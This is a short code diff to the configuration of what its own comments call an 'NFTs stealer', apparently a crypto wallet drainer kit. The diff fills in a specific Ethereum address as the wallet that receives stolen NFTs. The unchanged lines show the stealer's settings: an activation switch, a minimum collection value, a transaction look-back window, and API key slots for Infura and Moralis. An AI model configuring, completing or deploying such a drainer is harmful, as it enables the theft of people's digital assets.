@@ -1,4 +1,4 @@
-const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
+const address = "0x944e46DA966E838459c3F7401cCf243F9611A21F";    // Your wallet that you have to receive NFTs
 const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
 
@@ -33,7 +33,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "0x944e46DA966E838459c3F7401cCf243F9611A21F" // leave empty if you want to use the same address 
 }
 
 /* 
